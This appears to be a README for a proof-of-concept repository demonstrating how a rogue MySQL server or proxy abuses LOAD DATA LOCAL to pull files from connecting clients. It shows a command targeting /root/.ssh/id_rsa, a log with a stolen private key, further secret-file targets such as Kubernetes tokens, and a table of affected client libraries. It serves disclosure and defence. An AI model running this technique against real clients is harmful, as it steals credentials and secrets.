# Abusing MySQL's LOAD DATA LOCAL feature

The MySQL protocol supports uploading client-local files; in the SQL grammar this can be 
triggered via the LOAD DATA LOCAL statement. Still, the design has security implications
as described in this official advisory:

https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html

In short, a malicious MySQL server could send a protocol message to a client to request it
to upload a file, even if it was not initiated by the client itself (via a LOAD DATA LOCAL).

This repo is hosting two tools to demonstrate that behaviour. They are:
- proxy tool: it is a simple TCP proxy injecting the upload request messages, needs an 
  upstream MySQL server it connects to and relay the communication (so authentication
  is controlled by the real server).
- server tool: it is a dummy mysql server implementation (and thus needs some dependencies 
  to be installed). This tool accepts any connections (regardless what username/password
  the client is sending).

## Example

Run the application with these parameters:

```
$ perl rogue-mysql-server.pl /root/.ssh/id_rsa
[Sun Mar 14 17:40:14 2021 2400 ] Please use `mysql --host=127.0.0.1 --port=23306` to connect.
```

Then simply connect to it:

```
root@cloudshell:~/.ssh$ mysql -h 213.222.165.237 -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2400
Server version: DBIx::MyServer 0.42

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

At this point, the selected file is already uploaded to the malicious server:

```
[Sun Mar 14 17:40:16 2021 2400 34.90.245.119-root-] Username: root, Scramble: , Database:
[Sun Mar 14 17:40:16 2021 -19592 34.90.245.119-root-] Command: 3; Data: select @@version_comment limit 1
[Sun Mar 14 17:40:16 2021 -19592 34.90.245.119-root-] /root/.ssh/id_rsa (1856 bytes)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAtB8+E3Qoj3LWPaSMudHIfWAwWd+HSUS4q3Yo2Lv9nUDW1oWNsG5y
N1rpU2HsqbEoZn/ucJ9VGBs9drzvz9glm9S+TiLdmjCwYRrMI44xvJe3nPqMFRdbZz2luu
...
```

Another files with potentially sensitive content:

- /proc/self/environ

- /var/run/secrets/kubernetes.io/serviceaccount/token

## Affected client libraries

| Client library                  | Affected by default | Remarks                                     |
|---------------------------------|---------------------|---------------------------------------------|
| Debian mysql cli                | yes                 | 5.7.33-1debian10                            |
| Java's JDBD MySQL connector     | no                  | `allowLoadLocalInfile=true`                 |
| go-sql-driver/mysql             | no                  | `allowAllFiles=true`                        |
| PyMySQL                         | no                  | `local_infile=True`                         |
| PHP mysqli                      | version specific    | `mysqli.allow_local_infile=1`<br> Before 7.2.16 and 7.3.3 allowed by default  |
| Perl DBD::MySQL                 | no                  | `mysql_local_infile˙=1`                     |


## Limitations

You cannot steal multiple files in one session. I don't really know what the reason of this is, 
but the official CLI keeps disconnecting when it encounters multiple requests. Furthermore, it
also aborts the connection after serving one single file upload request - it might be possible
to fix this by reading the protocol specification more carefully.
